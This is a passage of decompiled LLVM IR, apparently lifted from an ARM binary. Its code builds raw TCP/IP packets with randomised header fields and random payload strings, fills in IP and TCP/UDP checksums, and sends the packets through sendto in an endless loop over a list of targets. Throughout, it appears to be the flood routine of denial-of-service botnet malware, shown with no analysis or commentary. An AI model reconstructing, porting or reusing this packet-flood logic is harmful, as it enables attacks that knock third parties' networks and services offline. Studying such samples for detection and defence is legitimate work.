  store i32 %v5_a520, i32* %v3_a524, align 4
  %v0_a528 = load i32, i32* @r8, align 4
  %v1_a528 = add i32 %v0_a528, 8
  %v2_a528 = inttoptr i32 %v1_a528 to i32*
  %v3_a528 = load i32, i32* %v2_a528, align 4
  store i32 %v3_a528, i32* %r1.global-to-local, align 4
  %v1_a52c = and i32 %v3_a528, 16711680
  store i32 %v1_a52c, i32* %r0.global-to-local, align 4
  store i32 %v6_a250, i32* %r2.global-to-local, align 4
  %v5_a544 = call i32 @llvm.bswap.i32(i32 %v3_a528)
  store i32 %v5_a544, i32* %r3.global-to-local, align 4
  %v1_a548 = add i32 %v0_a528, 2
  %v2_a548 = inttoptr i32 %v1_a548 to i16*
  %v3_a548 = load i16, i16* %v2_a548, align 2
  %v4_a548 = zext i16 %v3_a548 to i32
  store i32 %v4_a548, i32* %r1.global-to-local, align 4
  store i32 %v1_a54c, i32* @r7, align 4
  %v0_a550 = load i32, i32* @lr, align 4
  %v1_a550 = trunc i32 %v0_a550 to i16
  %v2_a550 = load i32, i32* %ip.global-to-local, align 4
  %v3_a550 = add i32 %v2_a550, 14
  %v4_a550 = inttoptr i32 %v3_a550 to i16*
  store i16 %v1_a550, i16* %v4_a550, align 2
  %v0_a554 = load i32, i32* %r1.global-to-local, align 4
  %v1_a554 = trunc i32 %v0_a554 to i16
  %v2_a554 = load i32, i32* %ip.global-to-local, align 4
  %v3_a554 = add i32 %v2_a554, 12
  %v4_a554 = inttoptr i32 %v3_a554 to i16*
  store i16 %v1_a554, i16* %v4_a554, align 2
  %v0_a558 = load i32, i32* %r3.global-to-local, align 4
  %v1_a558 = load i32, i32* %ip.global-to-local, align 4
  %v2_a558 = add i32 %v1_a558, 8
  %v3_a558 = inttoptr i32 %v2_a558 to i32*
  store i32 %v0_a558, i32* %v3_a558, align 4
  %v0_a55c = load i32, i32* @r7, align 4
  store i32 %v0_a55c, i32* @r0, align 4
  %v0_a560 = call i32 @malloc()
  store i32 %v0_a560, i32* %r0.global-to-local, align 4
  store i32 %v2_a0dc, i32* %r3.global-to-local, align 4
  %v2_a56c = load i32, i32* @r4, align 4
  %v5_a56c = mul i32 %v2_a56c, 4
  %v6_a56c = add i32 %v5_a56c, %v2_a0dc
  %v7_a56c = inttoptr i32 %v6_a56c to i32*
  store i32 %v0_a560, i32* %v7_a56c, align 4
  %v3_a570 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a570, i32* %r2.global-to-local, align 4
  %v0_a574 = load i32, i32* %r3.global-to-local, align 4
  %v4_a574 = mul i32 %v3_a570, 4
  %v5_a574 = add i32 %v0_a574, %v4_a574
  %v6_a574 = inttoptr i32 %v5_a574 to i32*
  %v7_a574 = load i32, i32* %v6_a574, align 4
  store i32 %v7_a574, i32* @r4, align 4
  %v1_a578 = inttoptr i32 %v7_a574 to i8*
  %v2_a578 = load i8, i8* %v1_a578, align 1
  %tmp103 = urem i8 %v2_a578, 16
  %v1_a57c = zext i8 %tmp103 to i32
  %v1_a580 = or i32 %v1_a57c, 64
  store i32 %v1_a580, i32* %r3.global-to-local, align 4
  %v1_a584 = trunc i32 %v1_a580 to i8
  store i8 %v1_a584, i8* %v1_a578, align 1
  %v0_a588 = load i32, i32* @r4, align 4
  %v1_a588 = inttoptr i32 %v0_a588 to i8*
  %v2_a588 = load i8, i8* %v1_a588, align 1
  %v0_a58c = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_a58c, 256
  %v1_a594 = and i8 %v2_a588, -16
  %v1_a598 = or i8 %v1_a594, 5
  %v1_a59c = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_a58c, 256
  %v4_a5a0 = urem i32 %tmp78, 256
  %v5_a5a0 = or i32 %v4_a5a0, %v1_a59c
  store i32 %v5_a5a0, i32* %r2.global-to-local, align 4
  %v0_a5a4 = load i32, i32* @fp, align 4
  %v1_a5a4 = urem i32 %v0_a5a4, 256
  store i32 %v1_a5a4, i32* %r0.global-to-local, align 4
  store i32 %v1_a15c, i32* %ip.global-to-local, align 4
  %v3_a5ac = udiv i32 %v0_a5a4, 256
  store i32 %v3_a5ac, i32* %r1.global-to-local, align 4
  store i8 %v1_a598, i8* %v1_a588, align 1
  %v0_a5b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5b4 = load i32, i32* %r0.global-to-local, align 4
  %v4_a5b4 = mul i32 %v1_a5b4, 256
  %v5_a5b4 = or i32 %v4_a5b4, %v0_a5b4
  store i32 %v5_a5b4, i32* %r1.global-to-local, align 4
  store i32 %v6_a0f4, i32* %r0.global-to-local, align 4
  %v2_a5bc = load i32, i32* @r4, align 4
  %v3_a5bc = add i32 %v2_a5bc, 1
  %v4_a5bc = inttoptr i32 %v3_a5bc to i8*
  store i8 %v5_a114, i8* %v4_a5bc, align 1
  %v0_a5c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5c0 = trunc i32 %v0_a5c0 to i16
  %v2_a5c0 = load i32, i32* @r4, align 4
  %v3_a5c0 = add i32 %v2_a5c0, 4
  %v4_a5c0 = inttoptr i32 %v3_a5c0 to i16*
  store i16 %v1_a5c0, i16* %v4_a5c0, align 2
  %v0_a5c4 = load i32, i32* %ip.global-to-local, align 4
  %v2_a5c4 = icmp eq i32 %v0_a5c4, 0
  store i1 %v2_a5c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_a150, i32* %r1.global-to-local, align 4
  %v0_a5cc = load i32, i32* %r2.global-to-local, align 4
  %v1_a5cc = trunc i32 %v0_a5cc to i16
  %v2_a5cc = load i32, i32* @r4, align 4
  %v3_a5cc = add i32 %v2_a5cc, 2
  %v4_a5cc = inttoptr i32 %v3_a5cc to i16*
  store i16 %v1_a5cc, i16* %v4_a5cc, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_a5c4, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_a4f0
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_a4f0, %bb79
  %v0_a5d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5d8 = trunc i32 %v0_a5d8 to i8
  %v2_a5d8 = load i32, i32* @r4, align 4
  %v3_a5d8 = add i32 %v2_a5d8, 8
  %v4_a5d8 = inttoptr i32 %v3_a5d8 to i8*
  store i8 %v1_a5d8, i8* %v4_a5d8, align 1
  %v0_a5dc = load i32, i32* %r3.global-to-local, align 4
  %v1_a5dc = trunc i32 %v0_a5dc to i8
  %v2_a5dc = load i32, i32* @r4, align 4
  %v3_a5dc = add i32 %v2_a5dc, 9
  %v4_a5dc = inttoptr i32 %v3_a5dc to i8*
  store i8 %v1_a5dc, i8* %v4_a5dc, align 1
  %v0_a5e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a5e0, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_a5e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_a5e0 = trunc i32 %v1_a5e0 to i16
  %v3_a5e0 = load i32, i32* @r4, align 4
  %v4_a5e0 = add i32 %v3_a5e0, 6
  %v5_a5e0 = inttoptr i32 %v4_a5e0 to i16*
  store i16 %v2_a5e0, i16* %v5_a5e0, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_2471c.58 to i32), i32* %r2.global-to-local, align 4
  %v2_a5e8 = load i32, i32* @global_var_2471c.58, align 4
  store i32 %v2_a5e8, i32* %r1.global-to-local, align 4
  %v1_a5ec = load i32, i32* @r4, align 4
  %v2_a5ec = add i32 %v1_a5ec, 12
  %v3_a5ec = inttoptr i32 %v2_a5ec to i32*
  store i32 %v2_a5e8, i32* %v3_a5ec, align 4
  %v3_a5f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a5f0, i32* %r3.global-to-local, align 4
  store i32 %v2_a0cc, i32* %ip.global-to-local, align 4
  %v4_a5f8 = mul i32 %v3_a5f0, 16
  %v5_a5f8 = add i32 %v4_a5f8, %v2_a0cc
  %v6_a5f8 = inttoptr i32 %v5_a5f8 to i32*
  %v7_a5f8 = load i32, i32* %v6_a5f8, align 4
  store i32 %v7_a5f8, i32* %r2.global-to-local, align 4
  store i32 %v5_a5f8, i32* %r3.global-to-local, align 4
  %v1_a604 = load i32, i32* @r4, align 4
  %v2_a604 = add i32 %v1_a604, 16
  %v3_a604 = inttoptr i32 %v2_a604 to i32*
  store i32 %v7_a5f8, i32* %v3_a604, align 4
  %v0_a608 = load i32, i32* %r3.global-to-local, align 4
  %v1_a608 = add i32 %v0_a608, 12
  %v2_a608 = inttoptr i32 %v1_a608 to i16*
  %v3_a608 = load i16, i16* %v2_a608, align 2
  %v4_a608 = zext i16 %v3_a608 to i32
  store i32 %v4_a608, i32* %r0.global-to-local, align 4
  %v1_a60c = add i32 %v0_a608, 8
  %v2_a60c = inttoptr i32 %v1_a60c to i32*
  %v3_a60c = load i32, i32* %v2_a60c, align 4
  store i32 %v3_a60c, i32* %r1.global-to-local, align 4
  %v2_a610 = load i32, i32* @r4, align 4
  %v3_a610 = add i32 %v2_a610, 20
  %v4_a610 = inttoptr i32 %v3_a610 to i16*
  store i16 %v3_a608, i16* %v4_a610, align 2
  %v0_a614 = load i32, i32* @r4, align 4
  %v1_a614 = add i32 %v0_a614, 20
  store i32 %v1_a614, i32* @r8, align 4
  %v1_a618 = add i32 %v0_a614, 33
  %v2_a618 = inttoptr i32 %v1_a618 to i8*
  %v3_a618 = load i8, i8* %v2_a618, align 1
  %v4_a618 = zext i8 %v3_a618 to i32
  store i32 %v4_a618, i32* %r2.global-to-local, align 4
  %v0_a61c = load i32, i32* %r1.global-to-local, align 4
  %v2_a61c = add i32 %v0_a614, 24
  %v3_a61c = inttoptr i32 %v2_a61c to i32*
  store i32 %v0_a61c, i32* %v3_a61c, align 4
  %v0_a620 = load i32, i32* %r2.global-to-local, align 4
  %v1_a620 = or i32 %v0_a620, 1
  store i32 %v1_a620, i32* %r2.global-to-local, align 4
  %v0_a624 = load i32, i32* %r3.global-to-local, align 4
  %v1_a624 = add i32 %v0_a624, 4
  %v2_a624 = inttoptr i32 %v1_a624 to i32*
  %v3_a624 = load i32, i32* %v2_a624, align 4
  store i32 %v3_a624, i32* %r1.global-to-local, align 4
  %v1_a628 = add i32 %v0_a624, 14
  %v2_a628 = inttoptr i32 %v1_a628 to i16*
  %v3_a628 = load i16, i16* %v2_a628, align 2
  %v4_a628 = zext i16 %v3_a628 to i32
  store i32 %v4_a628, i32* %r3.global-to-local, align 4
  %v1_a62c = trunc i32 %v1_a620 to i8
  %v2_a62c = load i32, i32* @r8, align 4
  %v3_a62c = add i32 %v2_a62c, 13
  %v4_a62c = inttoptr i32 %v3_a62c to i8*
  store i8 %v1_a62c, i8* %v4_a62c, align 1
  %v0_a630 = load i32, i32* %r3.global-to-local, align 4
  %v1_a630 = trunc i32 %v0_a630 to i16
  %v2_a630 = load i32, i32* @r8, align 4
  %v3_a630 = add i32 %v2_a630, 2
  %v4_a630 = inttoptr i32 %v3_a630 to i16*
  store i16 %v1_a630, i16* %v4_a630, align 2
  %v0_a634 = load i32, i32* @r8, align 4
  %v1_a634 = add i32 %v0_a634, 12
  %v2_a634 = inttoptr i32 %v1_a634 to i8*
  %v3_a634 = load i8, i8* %v2_a634, align 1
  %v4_a634 = zext i8 %v3_a634 to i32
  store i32 %v4_a634, i32* %r3.global-to-local, align 4
  %v1_a638 = add i32 %v0_a634, 13
  %v2_a638 = inttoptr i32 %v1_a638 to i8*
  %v3_a638 = load i8, i8* %v2_a638, align 1
  %v4_a638 = zext i8 %v3_a638 to i32
  %tmp104 = urem i8 %v3_a634, 16
  %v1_a63c = zext i8 %tmp104 to i32
  %v1_a640 = or i32 %v1_a63c, 128
  store i32 %v1_a640, i32* %r3.global-to-local, align 4
  %v1_a644 = or i32 %v4_a638, 16
  store i32 %v1_a644, i32* %r2.global-to-local, align 4
  %v0_a648 = load i32, i32* %r1.global-to-local, align 4
  %v2_a648 = add i32 %v0_a634, 8
  %v3_a648 = inttoptr i32 %v2_a648 to i32*
  store i32 %v0_a648, i32* %v3_a648, align 4
  %v0_a64c = load i32, i32* %r3.global-to-local, align 4
  %v1_a64c = trunc i32 %v0_a64c to i8
  %v2_a64c = load i32, i32* @r8, align 4
  %v3_a64c = add i32 %v2_a64c, 12
  %v4_a64c = inttoptr i32 %v3_a64c to i8*
  store i8 %v1_a64c, i8* %v4_a64c, align 1
  %v0_a650 = load i32, i32* %r2.global-to-local, align 4
  %v1_a650 = trunc i32 %v0_a650 to i8
  %v2_a650 = load i32, i32* @r8, align 4
  %v3_a650 = add i32 %v2_a650, 13
  %v4_a650 = inttoptr i32 %v3_a650 to i8*
  store i8 %v1_a650, i8* %v4_a650, align 1
  %v0_a654 = call i32 @rand_next()
  %v1_a654 = trunc i32 %v0_a654 to i16
  store i32 %v0_a654, i32* %r0.global-to-local, align 4
  store i32 %v1_a198, i32* %r1.global-to-local, align 4
  %v0_a65c = load i32, i32* @r8, align 4
  %v1_a65c = add i32 %v0_a65c, 13
  %v2_a65c = inttoptr i32 %v1_a65c to i8*
  %v3_a65c = load i8, i8* %v2_a65c, align 1
  %v4_a65c = zext i8 %v3_a65c to i32
  store i32 %v1_a660, i32* %r2.global-to-local, align 4
  %v1_a664 = and i32 %v4_a65c, 223
  %v5_a668 = or i32 %v1_a664, %v4_a668
  store i32 %v5_a668, i32* %r3.global-to-local, align 4
  %v1_a66c = trunc i32 %v5_a668 to i8
  store i8 %v1_a66c, i8* %v2_a65c, align 1
  store i32 %v1_a1b8, i32* %ip.global-to-local, align 4
  %v0_a674 = load i32, i32* @r8, align 4
  %v1_a674 = add i32 %v0_a674, 13
  %v2_a674 = inttoptr i32 %v1_a674 to i8*
  %v3_a674 = load i8, i8* %v2_a674, align 1
  %v4_a674 = zext i8 %v3_a674 to i32
  store i32 %v1_a678, i32* %r3.global-to-local, align 4
  %v1_a67c = and i32 %v4_a674, 239
  %v5_a680 = or i32 %v1_a67c, %v4_a680
  store i32 %v5_a680, i32* %r2.global-to-local, align 4
  %v1_a684 = trunc i32 %v5_a680 to i8
  store i8 %v1_a684, i8* %v2_a674, align 1
  store i32 %v1_a1d8, i32* %r1.global-to-local, align 4
  %v0_a68c = load i32, i32* @r8, align 4
  %v1_a68c = add i32 %v0_a68c, 13
  %v2_a68c = inttoptr i32 %v1_a68c to i8*
  %v3_a68c = load i8, i8* %v2_a68c, align 1
  %v4_a68c = zext i8 %v3_a68c to i32
  store i32 %v1_a690, i32* %r2.global-to-local, align 4
  %v1_a694 = and i32 %v4_a68c, 247
  %v5_a698 = or i32 %v1_a694, %v4_a698
  store i32 %v5_a698, i32* %r3.global-to-local, align 4
  %v1_a69c = trunc i32 %v5_a698 to i8
  store i8 %v1_a69c, i8* %v2_a68c, align 1
  store i32 %v1_a1f8, i32* %ip.global-to-local, align 4
  %v0_a6a4 = load i32, i32* @r8, align 4
  %v1_a6a4 = add i32 %v0_a6a4, 13
  %v2_a6a4 = inttoptr i32 %v1_a6a4 to i8*
  %v3_a6a4 = load i8, i8* %v2_a6a4, align 1
  %v4_a6a4 = zext i8 %v3_a6a4 to i32
  store i32 %v1_a6a8, i32* %r3.global-to-local, align 4
  %v1_a6ac = and i32 %v4_a6a4, 251
  %v5_a6b0 = or i32 %v1_a6ac, %v4_a6b0
  store i32 %v5_a6b0, i32* %r2.global-to-local, align 4
  %v1_a6b4 = trunc i32 %v5_a6b0 to i8
  store i8 %v1_a6b4, i8* %v2_a6a4, align 1
  store i32 %v1_a218, i32* %r1.global-to-local, align 4
  %v0_a6bc = load i32, i32* @r8, align 4
  %v1_a6bc = add i32 %v0_a6bc, 13
  %v2_a6bc = inttoptr i32 %v1_a6bc to i8*
  %v3_a6bc = load i8, i8* %v2_a6bc, align 1
  %v4_a6bc = zext i8 %v3_a6bc to i32
  store i32 %v1_a6c0, i32* %r2.global-to-local, align 4
  %v1_a6c4 = and i32 %v4_a6bc, 253
  %v4_a6c8 = or i32 %v1_a6c4, %v3_a6c8
  store i32 %v4_a6c8, i32* %r3.global-to-local, align 4
  %v1_a6cc = trunc i32 %v4_a6c8 to i8
  store i8 %v1_a6cc, i8* %v2_a6bc, align 1
  store i32 %v1_a238, i32* %ip.global-to-local, align 4
  %v0_a6d4 = load i32, i32* @r8, align 4
  %v1_a6d4 = add i32 %v0_a6d4, 13
  %v2_a6d4 = inttoptr i32 %v1_a6d4 to i8*
  %v3_a6d4 = load i8, i8* %v2_a6d4, align 1
  %v4_a6d4 = zext i8 %v3_a6d4 to i32
  %v1_a6dc = and i32 %v4_a6d4, 254
  store i32 %v1_a6dc, i32* %r2.global-to-local, align 4
  %v2_a6e0 = or i32 %v1_a6dc, %v1_a6d8
  store i32 %v2_a6e0, i32* %r3.global-to-local, align 4
  %v1_a6e4 = trunc i32 %v2_a6e0 to i8
  store i8 %v1_a6e4, i8* %v2_a6d4, align 1
  %v3_a6e8 = load i32, i32* @r8, align 4
  %v4_a6e8 = add i32 %v3_a6e8, 14
  %v5_a6e8 = inttoptr i32 %v4_a6e8 to i16*
  store i16 %v1_a654, i16* %v5_a6e8, align 2
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %v0_a6f0 = load i32, i32* @r4, align 4
  %v1_a6f0 = add i32 %v0_a6f0, 40
  store i32 %v1_a6f0, i32* %r0.global-to-local, align 4
  %v2_a6f4 = inttoptr i32 %v1_a6f0 to i16*
  %v3_a6f4 = call i32 @rand_str(i16* %v2_a6f4, i32 %v6_a250)
  store i32 %v3_a6f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a448

dec_label_pc_a6fc:                                ; preds = %dec_label_pc_a2bc
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_a250, 40
  br label %dec_label_pc_a70c

dec_label_pc_a70c:                                ; preds = %dec_label_pc_a45c, %dec_label_pc_a6fc
  %storemerge6.pre-phi = phi i32 [ %v1_a54c, %dec_label_pc_a45c ], [ %.pre, %dec_label_pc_a6fc ]
  %v0_a72026 = phi i32 [ %v1_a450, %dec_label_pc_a45c ], [ 0, %dec_label_pc_a6fc ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_a250, 65536
  %storemerge = add i32 %v6_a250, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_a70c = add i32 %storemerge4, 1310720
  store i32 %v1_a70c, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_a70c, 256
  %v3_a714 = and i32 %tmp83, 65280
  store i32 %v3_a714, i32* %r3.global-to-local, align 4
  %v4_a718 = udiv i32 %v1_a70c, 16777216
  %v5_a718 = or i32 %v3_a714, %v4_a718
  store i32 %v5_a718, i32* @r8, align 4
  %v2_a844 = icmp eq i32 %v1_a270, 0
  br label %dec_label_pc_a71c

dec_label_pc_a71c:                                ; preds = %dec_label_pc_a71c, %dec_label_pc_a828, %dec_label_pc_a70c
  %v0_a720 = phi i32 [ %v0_a72026, %dec_label_pc_a70c ], [ 0, %dec_label_pc_a828 ], [ 0, %dec_label_pc_a71c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a720 = icmp eq i32 %v0_a720, 0
  store i1 %v2_a720, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a720, label %dec_label_pc_a71c, label %dec_label_pc_a72c

dec_label_pc_a72c:                                ; preds = %dec_label_pc_a71c, %dec_label_pc_a828
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a730

dec_label_pc_a730:                                ; preds = %dec_label_pc_a758, %dec_label_pc_a72c
  %v1_a738 = phi i32 [ %v1_a818, %dec_label_pc_a758 ], [ 0, %dec_label_pc_a72c ]
  store i32 %v2_a0dc, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_a738 = mul i32 %v1_a738, 4
  %v5_a738 = add i32 %v4_a738, %v2_a0dc
  %v6_a738 = inttoptr i32 %v5_a738 to i32*
  %v7_a738 = load i32, i32* %v6_a738, align 4
  store i32 %v7_a738, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_a740 = load i32, i32* @fp, align 4
  %v9_a740 = icmp eq i32 %v0_a740, 65535
  store i1 %v9_a740, i1* %cpsr_z.global-to-local, align 1
  %v1_a744 = add i32 %v7_a738, 20
  store i32 %v1_a744, i32* @r5, align 4
  br i1 %v9_a740, label %dec_label_pc_a83c, label %dec_label_pc_a74c

dec_label_pc_a74c:                                ; preds = %dec_label_pc_a730
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i1 %v2_a844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a844, label %dec_label_pc_a758, label %dec_label_pc_a850

dec_label_pc_a758:                                ; preds = %dec_label_pc_a74c, %dec_label_pc_a83c, %dec_label_pc_a850
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_a75c = load i32, i32* @r4, align 4
  %v3_a75c = add i32 %v2_a75c, 10
  %v4_a75c = inttoptr i32 %v3_a75c to i16*
  store i16 0, i16* %v4_a75c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a764 = load i32, i32* @r4, align 4
  store i32 %v0_a764, i32* @r0, align 4
  %v2_a768 = call i32 @checksum_generic(i32 %v0_a764, i32 20)
  %v3_a768 = trunc i32 %v2_a768 to i16
  store i32 %v2_a768, i32* %r0.global-to-local, align 4
  %v3_a76c = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_a0cc, i32* %r2.global-to-local, align 4
  %v3_a774 = mul i32 %v3_a76c, 16
  %v2_a778 = add i32 %v3_a774, %v2_a0cc
  store i32 %v2_a778, i32* %r1.global-to-local, align 4
  %v1_a77c = add i32 %v2_a778, 4
  %v2_a77c = inttoptr i32 %v1_a77c to i32*
  %v3_a77c = load i32, i32* %v2_a77c, align 4
  %v3_a780 = mul i32 %v3_a77c, 65536
  store i32 %v3_a780, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_a77c, 256
  %v1_a788 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_a77c, 256
  %v4_a78c = urem i32 %tmp86, 256
  %v5_a78c = or i32 %v4_a78c, %v1_a788
  store i32 %v5_a78c, i32* %r3.global-to-local, align 4
  %v1_a790 = add i32 %v3_a77c, 1
  store i32 %v1_a790, i32* %r2.global-to-local, align 4
  store i32 %v1_a790, i32* %v2_a77c, align 4
  %v0_a798 = load i32, i32* %r3.global-to-local, align 4
  %v1_a798 = load i32, i32* @r5, align 4
  %v2_a798 = add i32 %v1_a798, 4
  %v3_a798 = inttoptr i32 %v2_a798 to i32*
  store i32 %v0_a798, i32* %v3_a798, align 4
  %v0_a79c = load i32, i32* %r1.global-to-local, align 4
  %v1_a79c = add i32 %v0_a79c, 8
  %v2_a79c = inttoptr i32 %v1_a79c to i32*
  %v3_a79c = load i32, i32* %v2_a79c, align 4
  %tmp87 = mul i32 %v3_a79c, 256
  %v1_a7a8 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_a79c, 256
  %v4_a7ac = urem i32 %tmp88, 256
  %v5_a7ac = or i32 %v4_a7ac, %v1_a7a8
  %v1_a7b0 = load i32, i32* @r5, align 4
  %v2_a7b0 = add i32 %v1_a7b0, 8
  %v3_a7b0 = inttoptr i32 %v2_a7b0 to i32*
  store i32 %v5_a7ac, i32* %v3_a7b0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a7b8 = load i32, i32* @r4, align 4
  %v4_a7b8 = add i32 %v3_a7b8, 10
  %v5_a7b8 = inttoptr i32 %v4_a7b8 to i16*
  store i16 %v3_a768, i16* %v5_a7b8, align 2
  %v0_a7bc = load i32, i32* @r5, align 4
  store i32 %v0_a7bc, i32* @r1, align 4
  %v0_a7c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a7c0 = trunc i32 %v0_a7c0 to i16
  %v3_a7c0 = add i32 %v0_a7bc, 16
  %v4_a7c0 = inttoptr i32 %v3_a7c0 to i16*
  store i16 %v1_a7c0, i16* %v4_a7c0, align 2
  %v0_a7c4 = load i32, i32* @r8, align 4
  store i32 %v0_a7c4, i32* %r2.global-to-local, align 4
  %v0_a7c8 = load i32, i32* @sl, align 4
  store i32 %v0_a7c8, i32* %r3.global-to-local, align 4
  %v0_a7cc = load i32, i32* @r4, align 4
  store i32 %v0_a7cc, i32* %r0.global-to-local, align 4
  %v4_a7d0 = call i32 @checksum_tcpudp(i32 %v0_a7cc, i32 %v0_a7bc, i32 %v0_a7c4, i32 %v0_a7c8)
  %v5_a7d0 = trunc i32 %v4_a7d0 to i16
  store i32 %v4_a7d0, i32* %r0.global-to-local, align 4
  %v3_a7d4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a7d4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_a7dc = mul i32 %v3_a7d4, 32
  store i32 %v3_a7dc, i32* %lr.global-to-local, align 4
  %v3_a7e0 = load i32, i32* @r5, align 4
  %v4_a7e0 = add i32 %v3_a7e0, 16
  %v5_a7e0 = inttoptr i32 %v4_a7e0 to i16*
  store i16 %v5_a7d0, i16* %v5_a7e0, align 2
  %v0_a7e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_a7e4 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_a7e4, -8
  %v5_a7e4 = add i32 %v0_a7e4, %tmp105
  store i32 %v5_a7e4, i32* %lr.global-to-local, align 4
  %v0_a7e8 = load i32, i32* @r5, align 4
  %v1_a7e8 = add i32 %v0_a7e8, 2
  %v2_a7e8 = inttoptr i32 %v1_a7e8 to i16*
  %v3_a7e8 = load i16, i16* %v2_a7e8, align 2
  %v4_a7e8 = zext i16 %v3_a7e8 to i32
  store i32 %v4_a7e8, i32* @r5, align 4
  %v1_a7ec = load i32, i32* %ip.global-to-local, align 4
  %v2_a7ec = add i32 %v1_a7ec, %v5_a7e4
  store i32 %v2_a7ec, i32* @lr, align 4
  %v3_a7f0 = add i32 %v2_a7ec, 2
  %v4_a7f0 = inttoptr i32 %v3_a7f0 to i16*
  store i16 %v3_a7e8, i16* %v4_a7f0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a7fc = load i32, i32* @r4, align 4
  store i32 %v0_a7fc, i32* %r1.global-to-local, align 4
  %v0_a800 = load i32, i32* @sb, align 4
  store i32 %v0_a800, i32* %r0.global-to-local, align 4
  %v0_a804 = load i32, i32* @r7, align 4
  store i32 %v0_a804, i32* %r2.global-to-local, align 4
  %v0_a808 = load i32, i32* @lr, align 4
  %v6_a810 = call i32 @__libc_sendto(i32 %v0_a800, i32 %v0_a7fc, i32 %v0_a804, i32 16384, i32 %v0_a808, i32 16)
  %v3_a814 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a814, i32* %r3.global-to-local, align 4
  %v1_a818 = add i32 %v3_a814, 1
  store i32 %v1_a818, i32* %r0.global-to-local, align 4
  %v0_a81c = load i32, i32* @r6, align 4
  %v9_a81c = icmp eq i32 %v0_a81c, %v1_a818
  store i1 %v9_a81c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a818, i32* %stack_var_-44, align 4
  %v8_a824 = icmp sgt i32 %v0_a81c, %v1_a818
  br i1 %v8_a824, label %dec_label_pc_a730, label %dec_label_pc_a828

dec_label_pc_a828:                                ; preds = %dec_label_pc_a758
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a82c = icmp eq i32 %v0_a81c, 0
  store i1 %v2_a82c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a82c, label %dec_label_pc_a71c, label %dec_label_pc_a72c

dec_label_pc_a83c:                                ; preds = %dec_label_pc_a730
  %v0_a83c = call i32 @rand_next()
  %v1_a83c = trunc i32 %v0_a83c to i16
  store i32 %v0_a83c, i32* %r0.global-to-local, align 4
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i1 %v2_a844, i1* %cpsr_z.global-to-local, align 1
  %v3_a848 = load i32, i32* @r4, align 4
  %v4_a848 = add i32 %v3_a848, 4
  %v5_a848 = inttoptr i32 %v4_a848 to i16*
  store i16 %v1_a83c, i16* %v5_a848, align 2
  br i1 %v2_a844, label %dec_label_pc_a758, label %dec_label_pc_a83c.dec_label_pc_a850_crit_edge

dec_label_pc_a83c.dec_label_pc_a850_crit_edge:    ; preds = %dec_label_pc_a83c
  %v0_a850.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a850

dec_label_pc_a850:                                ; preds = %dec_label_pc_a83c.dec_label_pc_a850_crit_edge, %dec_label_pc_a74c
  %v0_a850 = phi i32 [ %v0_a850.pre, %dec_label_pc_a83c.dec_label_pc_a850_crit_edge ], [ %v7_a738, %dec_label_pc_a74c ]
  %v1_a850 = add i32 %v0_a850, 40
  store i32 %v1_a850, i32* %r0.global-to-local, align 4
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %v2_a858 = inttoptr i32 %v1_a850 to i16*
  %v3_a858 = call i32 @rand_str(i16* %v2_a858, i32 %v6_a250)
  store i32 %v3_a858, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a758

; uselistorder directives
  uselistorder i32 %v0_a83c, { 1, 0 }
  uselistorder i32 %v1_a818, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_a7e4, { 1, 0 }
  uselistorder i32 %v4_a7d0, { 1, 0 }
  uselistorder i32 %v3_a79c, { 1, 0 }
  uselistorder i32 %v3_a77c, { 3, 2, 0, 1 }
  uselistorder i32 %v2_a768, { 1, 0 }
